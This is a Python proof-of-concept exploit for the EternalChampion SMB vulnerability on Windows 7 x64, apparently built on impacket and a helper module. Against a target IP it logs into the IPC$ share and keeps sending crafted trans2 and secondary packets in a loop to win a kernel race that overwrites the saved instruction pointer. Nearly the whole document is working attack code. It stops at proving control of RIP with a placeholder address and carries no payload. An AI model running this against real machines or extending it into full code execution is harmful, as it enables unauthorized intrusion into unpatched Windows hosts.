#!/usr/bin/python
from impacket import smb
from mysmb import MYSMB
from struct import pack
import sys

'''
PoC: demonstrates how NSA eternalchampion controls RIP

Note:
- this PoC is tested against only Windows 7 x64 with 2 and 4 logical processors
'''

USERNAME = ''
PASSWORD = ''

if len(sys.argv) != 2:
	print("{} <ip>".format(sys.argv[0]))
	sys.exit(1)

target = sys.argv[1]


conn = MYSMB(target)
conn.login(USERNAME, PASSWORD)

# if share name is disk, the race is easier to win because there are more operation to do after InData is modified
tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
conn.set_default_tid(tid)


def nsa_race(conn, jmp_addr):
	setup = pack('<H', 5)  # QUERY_PATH_INFO
	
	# set info level to SMB_INFO_QUERY_EA_SIZE at request to force SrvSmbQueryPathInformation restart in another thread
	param = pack('<HI', 2, 0) + '\x00'*4  # infoLevel, reserved, filename
	mid = conn.next_mid()
	# we will overwrite 8 bytes at displacement 312, so data must be at least 320 bytes
	req1 = conn.create_trans2_packet(setup, param=param, data='A'*324, mid=mid)
	# change infoLevel parameter to SMB_INFO_IS_NAME_VALID
	req2 = conn.create_trans2_secondary_packet(mid, param=pack('<H', 6))
	req3 = conn.create_trans2_secondary_packet(mid, data=pack('<Q', jmp_addr), dataDisplacement=312)

	conn.send_raw(req1+req2+req3*8)
	recvPkt = conn.recvSMB()
	status = recvPkt.getNTStatus()
	if status == 0xc0000022: # ACCESS_DENIED
		# fail to modify infoLevel parameter to SMB_INFO_IS_NAME_VALID
		#print('the race is completely fail')
		sys.stdout.write('.')
	elif status == 0xc0000010:  # INVALID_DEVICE_REQUEST
		#print('there is a race')
		sys.stdout.write('*')
	else:
		sys.stdout.write('?')
	sys.stdout.flush()


def my_race(conn, jmp_addr):
	setup = pack('<H', 5)  # QUERY_PATH_INFO
	param = pack('<HI', 6, 0) + '\x00'*4  # infoLevel, reserved, filename
	
	# directly race
	for i in range(8):
		mid = conn.next_mid()
		req1 = conn.create_trans2_packet(setup, param=param, data='A'*324, mid=mid)
		req3 = conn.create_trans2_secondary_packet(mid, data=pack('<Q', jmp_addr), dataDisplacement=312)
		conn.send_raw(req1+req3*11)
	for i in range(8):
		recvPkt = conn.recvSMB()
		if recvPkt.getNTStatus() != 0xc0000010:
			#print('return status: 0x{:x}'.format(recvPkt.getNTStatus()))
			sys.stdout.write('*')
		else:
			sys.stdout.write('.')
		sys.stdout.flush()

while True:
	# if win a race, saved RIP will be modified to 0x4141414141414141
	nsa_race(conn, 0x4141414141414141)
	#my_race(conn, 0x4141414141414141)
	
conn.disconnect_tree(tid)
conn.logoff()
conn.get_socket().close()
